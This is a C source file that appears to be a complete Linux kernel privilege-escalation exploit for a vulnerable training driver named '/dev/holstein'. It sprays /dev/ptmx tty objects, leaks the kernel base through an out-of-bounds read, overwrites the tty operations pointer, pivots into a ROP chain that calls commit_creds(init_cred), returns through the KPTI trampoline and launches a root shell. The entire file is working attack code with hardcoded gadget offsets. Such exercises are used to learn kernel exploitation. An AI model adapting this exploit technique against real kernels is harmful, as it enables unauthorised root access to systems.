#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define ofs_tty_ops 0xc38880
#define rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp (kbase + 0x3a478a)
#define POP_RDI (kbase + 0xd748d)
#define COMMIT_CREDS (kbase + 0x744b0)
#define INIT_CRED (kbase + 0xE37760)
#define KPTI_TRAMPOLINE (kbase + 0x800e26)

// for saved states
uint64_t iter, user_cs, user_ss, user_rflags, user_rsp;
uint64_t kbase, g_buf;

void save_state()
{
    asm volatile(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");

    INFO("Saved state");
}

static void win()
{
    char* argv[] = { "/bin/sh", NULL };
    char* envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

int main()
{
    save_state();

    int spray[100];

    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1) {
            ERROR("/dev/ptmx");
        }
    }

    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1)
        ERROR("/dev/holstein");

    for (int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1) {
            ERROR("/dev/ptmx");
        }
    }

    char buf[0x500];
    read(fd, buf, 0x500);

    kbase = *(uint64_t*)&buf[0x418] - ofs_tty_ops;
    printf("[+] kbase = 0x%016lx\n", kbase);

    g_buf = *(uint64_t*)&buf[0x438] - 0x438;
    printf("[+] g_buf = 0x%016lx\n", g_buf);

    uint64_t* p = (uint64_t*)&buf;
    p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
    *(uint64_t*)&buf[0x418] = g_buf;

    *p++ = POP_RDI;
    *p++ = INIT_CRED;
    *p++ = COMMIT_CREDS;
    // restore state
    *p++ = KPTI_TRAMPOLINE;
    p++;
    p++;
    *p++ = (unsigned long)&win;
    *p++ = user_cs;
    *p++ = user_rflags;
    *p++ = user_rsp;
    *p++ = user_ss;

    write(fd, buf, 0x420);

    ioctl(spray[50], 0xdeadbeef, g_buf - 0x10);
    // for (int i = 0; i < 100; i++) {
    //     ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
    // }

    close(fd);
    return 0;
}